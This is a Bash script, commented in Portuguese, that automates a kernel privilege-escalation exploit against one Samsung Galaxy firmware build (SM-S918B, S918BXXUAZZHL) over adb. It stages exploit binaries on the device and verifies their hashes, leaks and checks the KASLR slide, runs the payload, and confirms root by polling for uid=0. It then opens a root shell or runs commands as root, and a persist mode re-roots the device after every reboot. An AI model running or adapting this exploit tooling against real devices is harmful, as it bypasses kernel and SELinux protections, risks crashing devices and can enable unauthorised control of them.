#!/usr/bin/env bash
set -Eeuo pipefail

SERIAL="${ANDROID_SERIAL:-RXCX602E20X}"
ADB=(adb -s "$SERIAL")
LOCAL_ASSETS="${ZZHL_ASSETS:-/home/matias/Projects/diamond-fox-root-cli (1)/extracted/s918b-zzhl-f156/assets}"
REMOTE=/data/local/tmp/rmg-zzhl
HELPER="$REMOTE/helper"
PAYLOAD="$REMOTE/app.so"
SLIDER="$REMOTE/tracefs-slide.so"
SLIDE_LOG="$REMOTE/slide.log"
ROOT_LOG="$REMOTE/root.log"
MODE=shell
COMMAND=""

ADB_RETRY_COUNT="${ADB_RETRY_COUNT:-6}"
ADB_RETRY_WAIT="${ADB_RETRY_WAIT:-2}"
ROOT_TOTAL_BUDGET="${ROOT_TOTAL_BUDGET:-1200}"
ROOT_CONFIRM_GRACE="${ROOT_CONFIRM_GRACE:-30}"
# Uma tentativa que falha (perde a corrida de heap) deixa o orçamento de
# páginas de pipe do uid=2000(shell) contaminado para o resto do boot; as
# tentativas seguintes do MESMO helper então morrem sempre com
# EPERM em F_SETPIPE_SZ, não por falta de sorte. Por isso o padrão aqui é
# 1 tentativa por boot: se falhar, reinicie o aparelho em vez de deixar o
# helper queimar tentativas 2/3 já condenadas.
EXPLOIT_ATTEMPTS="${EXPLOIT_ATTEMPTS:-1}"
SLIDE_MAX=0x1f8000
SLIDE_ALIGN=0x8000
BAD_SLIDES=(0x1a0000 0x1a8000)

usage() {
  cat <<'EOF'
Uso:
  root-adb-zzhl.sh                 obtém root e abre shell interativo
  root-adb-zzhl.sh -c 'comando'    executa um comando como root
  root-adb-zzhl.sh --persist       mantém o host ativo e refaz root após reboot

Variáveis:
  ANDROID_SERIAL, ZZHL_ASSETS
  FORCE_UNSUPPORTED=1   ignora a checagem de fingerprint (não recomendado)
  ADB_RETRY_COUNT, ADB_RETRY_WAIT     tolerância a quedas transitórias de USB/adb
  ROOT_TOTAL_BUDGET, ROOT_CONFIRM_GRACE  janelas de espera pela confirmação de root
  EXPLOIT_ATTEMPTS (padrão 1)  tentativas do helper por boot; ver comentário no script
EOF
}

case "${1:-}" in
  -c|--command) MODE=command; COMMAND="${2:?comando ausente}" ;;
  --persist) MODE=persist ;;
  -h|--help) usage; exit 0 ;;
  "") ;;
  *) echo "opção inválida: $1" >&2; usage; exit 2 ;;
esac

need_file() {
  [[ -f "$1" ]] || { echo "arquivo ausente: $1" >&2; exit 1; }
}

is_transient_adb_error() {
  [[ "$1" == *"not found"* || "$1" == *"device offline"* || "$1" == *"no devices/emulators"* ]]
}

# Executa um comando remoto, tolerando quedas transitórias de USB/adb (as
# mesmas que aparecem no dmesg como "USB disconnect" / "unable to enumerate").
# Sem isso, uma queda de meio segundo durante o exploit derruba o script
# inteiro mesmo quando o root já tinha sido conquistado.
adb_shell() {
  local out rc attempt=1
  while true; do
    if out="$("${ADB[@]}" shell "$1" 2>&1)"; then
      printf '%s\n' "$out"
      return 0
    fi
    rc=$?
    if ! is_transient_adb_error "$out" || (( attempt >= ADB_RETRY_COUNT )); then
      printf '%s\n' "$out" >&2
      return "$rc"
    fi
    "${ADB[@]}" wait-for-device >/dev/null 2>&1 || true
    sleep "$ADB_RETRY_WAIT"
    ((attempt++))
  done
}

root_alive() {
  timeout 5 "${ADB[@]}" shell "$HELPER -c 'id'" 2>/dev/null |
    grep -q 'uid=0(root)'
}

# Confere modelo/codename/build/contexto antes de disparar o exploit. Os
# offsets do helper são fixos para S918BXXUAZZHL; rodar contra outro
# device/build não falha "de forma segura", tende a crashar o kernel.
check_target() {
  local out model device fingerprint boot_completed idline context
  out="$(adb_shell "getprop ro.product.model; getprop ro.product.device; getprop ro.build.fingerprint; getprop sys.boot_completed; id; cat /proc/self/attr/current")" || {
    echo "não foi possível consultar o dispositivo para validação" >&2
    return 1
  }
  model="$(sed -n '1p' <<<"$out" | tr -d '\r')"
  device="$(sed -n '2p' <<<"$out" | tr -d '\r')"
  fingerprint="$(sed -n '3p' <<<"$out" | tr -d '\r')"
  boot_completed="$(sed -n '4p' <<<"$out" | tr -d '\r')"
  idline="$(sed -n '5p' <<<"$out" | tr -d '\r')"
  context="$(sed -n '6p' <<<"$out" | tr -d '\r')"

  local ok=1
  [[ "${model//_/-}" == "SM-S918B" ]] || { echo "modelo inesperado: $model" >&2; ok=0; }
  [[ "$device" == "dm3q" ]] || { echo "device codename inesperado: $device" >&2; ok=0; }
  [[ "$boot_completed" == "1" ]] || { echo "Android ainda não terminou de bootar" >&2; ok=0; }
  [[ "$idline" == uid=2000\(shell\)* ]] || { echo "identidade adb inesperada: $idline" >&2; ok=0; }
  [[ "$context" == "u:r:shell:s0" ]] || { echo "contexto SELinux inesperado: $context" >&2; ok=0; }
  if [[ "$fingerprint" != *ZZHL* ]]; then
    echo "fingerprint não contém ZZHL: $fingerprint" >&2
    if [[ "${FORCE_UNSUPPORTED:-0}" == "1" ]]; then
      echo "FORCE_UNSUPPORTED=1: continuando mesmo assim" >&2
    else
      ok=0
    fi
  fi
  if (( ! ok )); then
    echo "dispositivo não corresponde ao perfil esperado (S918BXXUAZZHL); abortando para não arriscar crash" >&2
    return 1
  fi
  echo "[*] alvo confirmado: ${model//_/-}/$device fingerprint=$fingerprint" >&2
}

stage() {
  need_file "$LOCAL_ASSETS/helper"
  need_file "$LOCAL_ASSETS/app.so"
  need_file "$LOCAL_ASSETS/tracefs-slide.so"
  "${ADB[@]}" wait-for-device
  adb_shell "mkdir -p '$REMOTE'" >/dev/null
  "${ADB[@]}" push "$LOCAL_ASSETS/helper" "$HELPER" >/dev/null
  "${ADB[@]}" push "$LOCAL_ASSETS/app.so" "$PAYLOAD" >/dev/null
  "${ADB[@]}" push "$LOCAL_ASSETS/tracefs-slide.so" "$SLIDER" >/dev/null
  adb_shell "chmod 755 '$HELPER' '$PAYLOAD' '$SLIDER'" >/dev/null
}

# Confirma que o que chegou no aparelho é byte-a-byte o que saiu do host.
# Um push corrompido não avisa nada sozinho, só produz um exploit instável.
verify_remote_hashes() {
  local remote
  remote="$(adb_shell "sha256sum '$HELPER' '$PAYLOAD' '$SLIDER'")" || return 1
  remote="$(tr 'A-F' 'a-f' <<<"$remote")"
  local entry remote_path local_file hash line found
  for entry in "$HELPER:$LOCAL_ASSETS/helper" "$PAYLOAD:$LOCAL_ASSETS/app.so" "$SLIDER:$LOCAL_ASSETS/tracefs-slide.so"; do
    remote_path="${entry%%:*}"
    local_file="${entry#*:}"
    hash="$(sha256sum "$local_file" | awk '{print $1}')"
    found=0
    while IFS= read -r line; do
      if [[ "$line" == *"$hash"* && "$line" == *"$remote_path"* ]]; then
        found=1
        break
      fi
    done <<<"$remote"
    if (( ! found )); then
      echo "hash remoto não confere para $remote_path (push corrompido?)" >&2
      return 1
    fi
  done
  echo "[*] integridade dos assets confirmada (sha256)" >&2
}

# Rejeita slides KASLR fora da política (faixa/alinhamento, e os offsets
# 0x1a0000/0x1a8000 que o próprio DiamondFox marca como incompatíveis).
# Como o slide é fixo por boot, um valor ruim não se resolve tentando de
# novo: é preciso reiniciar o aparelho para sortear outro.
validate_slide() {
  local slide="$1" dec bad
  dec=$((slide))
  if (( dec > SLIDE_MAX )); then
    echo "slide fora da política (maior que $SLIDE_MAX): $slide" >&2
    return 1
  fi
  if (( dec % SLIDE_ALIGN != 0 )); then
    echo "slide não alinhado a $SLIDE_ALIGN: $slide" >&2
    return 1
  fi
  for bad in "${BAD_SLIDES[@]}"; do
    if (( dec == bad )); then
      echo "slide está na lista de offsets conhecidos como problemáticos: $slide" >&2
      return 1
    fi
  done
}

resolve_slide() {
  adb_shell "rm -f '$SLIDE_LOG'; SLIDE_ONLY=1 SLIDE_TRACEFS_CAPTURE_SECONDS=3 EXPLOIT_ATTEMPTS=2 EXPLOIT_ATTEMPT_TIMEOUT_SEC=60 '$HELPER' --run-payload '$SLIDER' '$HELPER' '$SLIDE_LOG'" >/dev/null 2>&1 || true
  local slide
  slide="$(adb_shell "cat '$SLIDE_LOG'" | sed -n 's/.*p0_offset=\([0-9a-fA-F][0-9a-fA-F]*\).*/0x\1/p' | tail -1 | tr -d '\r')"
  [[ "$slide" =~ ^0x[0-9a-fA-F]+$ ]] || {
    adb_shell "cat '$SLIDE_LOG'" >&2
    echo "não foi possível calcular o slide" >&2
    return 1
  }
  printf '%s\n' "$slide"
}

# Roda o exploit em background e confirma o root por sondagem independente,
# em vez de depender do retorno da MESMA chamada adb shell do exploit. Isso
# é o que evita o "sempre dá erro": se o USB cair um instante depois do
# root ter sido conquistado, a sondagem separada ainda vê uid=0.
run_exploit_and_confirm() {
  local cmd="$1"
  local start=$SECONDS job_status=0

  "${ADB[@]}" shell "$cmd" &
  local job=$!

  while kill -0 "$job" 2>/dev/null; do
    if root_alive; then
      echo "[+] root confirmado (processo do exploit segue finalizando em background)" >&2
      return 0
    fi
    if (( SECONDS - start > ROOT_TOTAL_BUDGET )); then
      echo "[!] tempo limite total atingido aguardando o exploit" >&2
      kill "$job" 2>/dev/null || true
      wait "$job" 2>/dev/null || true
      return 1
    fi
    sleep 1
  done

  wait "$job" || job_status=$?
  local grace_until=$((SECONDS + ROOT_CONFIRM_GRACE))
  while (( SECONDS < grace_until )); do
    root_alive && return 0
    sleep 1
  done
  return "$job_status"
}

gain_root() {
  root_alive && return 0
  check_target
  stage
  verify_remote_hashes
  local slide
  slide="$(resolve_slide)"
  validate_slide "$slide" || {
    echo "reinicie o aparelho e execute novamente (slide KASLR desta boot está fora da política)" >&2
    return 1
  }
  echo "[*] slide KASLR: $slide"
  local exploit_cmd="rm -f '$ROOT_LOG' '$ROOT_LOG.milestones'; RMG_DURABLE_MILESTONES=1 APP_FOPS_USE_SIGRETURN=1 SLIDE_P0_OFFSET='$slide' EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS P0_ATTEMPT_TIMEOUT_SEC=60 EXPLOIT_ATTEMPT_TIMEOUT_SEC=240 '$HELPER' --run-payload '$PAYLOAD' '$HELPER' '$ROOT_LOG'"
  run_exploit_and_confirm "$exploit_cmd" || true
  if ! root_alive; then
    timeout 8 "${ADB[@]}" shell "tail -80 '$ROOT_LOG'" >&2 || true
    echo "root não ficou ativo; reinicie o aparelho e execute novamente" >&2
    return 1
  fi
  echo "[+] root ativo durante este boot"
}

interactive_shell() {
  exec "${ADB[@]}" shell -t "$HELPER -c '/system/bin/sh -i'"
}

run_once() {
  gain_root
  case "$MODE" in
    shell) interactive_shell ;;
    command) adb_shell "$HELPER -c '$COMMAND'" ;;
  esac
}

if [[ "$MODE" != persist ]]; then
  run_once
  exit
fi

echo "[*] modo persistente; Ctrl+C encerra"
last_boot=""
while true; do
  "${ADB[@]}" wait-for-device
  boot="$(adb_shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')"
  if [[ -z "$boot" ]]; then
    # leitura falhou (queda transitória): não trata como reboot, só tenta de novo
    sleep 5
    continue
  fi
  if [[ "$boot" != "$last_boot" ]] || ! root_alive; then
    if gain_root; then
      last_boot="$boot"
    else
      echo "[!] aguardando reboot para nova tentativa" >&2
      while [[ "$(adb_shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')" == "$boot" ]]; do
        sleep 5
      done
    fi
  fi
  sleep 5
done
